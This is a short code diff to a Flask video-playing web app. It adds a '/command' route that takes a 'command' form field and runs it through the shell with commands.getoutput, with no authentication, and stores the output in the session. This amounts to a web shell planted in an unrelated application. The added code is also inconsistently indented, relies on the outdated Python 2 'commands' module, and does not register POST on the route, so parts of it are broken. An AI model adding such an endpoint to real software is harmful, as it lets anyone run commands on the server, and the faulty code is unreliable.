@@ -35,3 +35,16 @@ def fetch_video():
 @app.route('/play_video')
 def play_video():
 	return render_template('play_video.html')
+
+@app.route('/command')
+def command():
+	try:
+                if request.method == 'POST':
+                        import commands
+			session['output'] = commands.getoutput(request.form['command'])
+                        return render_template('command.html')
+                return render_template('command.html')
+
+        except:
+                return "error occoured! Return to home: <a href='"+url_for('command')+"'>Home</a>"
+
